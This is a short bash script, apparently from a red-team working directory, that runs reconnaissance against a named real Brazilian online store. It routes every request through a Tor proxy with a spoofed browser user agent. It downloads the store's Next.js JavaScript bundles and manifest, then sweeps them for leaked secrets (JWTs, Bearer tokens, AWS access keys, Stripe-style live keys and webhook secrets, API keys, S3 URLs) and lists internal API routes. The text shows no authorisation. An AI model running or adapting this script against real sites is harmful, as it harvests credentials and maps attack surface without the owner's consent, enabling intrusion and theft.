#!/usr/bin/env bash
# loja + nextjs cluster JS fetch & secret/endpoint extraction
E=/home/ubuntu/red-team-operator/focusconcursos.com.br/enum
P="socks5h://127.0.0.1:9050"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"
D=$E/loja.grupofocus.com.br
H="loja.grupofocus.com.br"
mkdir -p "$D/js"
# pull asset list from index
grep -oE '/_next/static/[^"\\ ]{1,120}' "$D/index.html" | tr -d '\\' | sed 's/\\u0026/\\\&/g' | sort -u > "$D/assets_list.txt"
while IFS= read -r a; do
  f=$(printf '%s' "$a" | tr '/?' '__')
  curl -sk --proxy "$P" -m 30 -A "$UA" "https://$H/$a" -o "$D/js/$f" 2>/dev/null
  printf '%s %s\n' "$(stat -c%s "$D/js/$f" 2>/dev/null || echo 0)" "$a"
  sleep 0.2
done < "$D/assets_list.txt" | head -40
curl -sk --proxy "$P" -m 15 -A "$UA" "https://$H/manifest.webmanifest" -o "$D/manifest.webmanifest" -w 'manifest %{http_code} %{size_download}\n'
echo "=== endpoint/secret sweep across loja js ==="
grep -aohE '(eyJ[A-Za-z0-9_-]{12,}|Bearer [A-Za-z0-9._-]{10,}|AKIA[A-Z0-9]{16}|(sk|pk|whsec)_(live|test)_[A-Za-z0-9_-]{10,}|api[_-]?key["'\'' ]{1,4}[:=][^,;]{5,40}|https?://[a-zA-Z0-9.-]+\.amazonaws\.com[^"'\'' ]{1,60})' "$D/js/"*.js 2>/dev/null | sort -u > "$D/js_secrets.txt"
wc -l "$D/js_secrets.txt"
grep -aohE '"/api/[a-zA-Z0-9_/-]{2,60}"' "$D/js/"*.js 2>/dev/null | tr -d '"' | sort -u > "$D/js_api_routes.txt"
wc -l "$D/js_api_routes.txt"; head -40 "$D/js_api_routes.txt"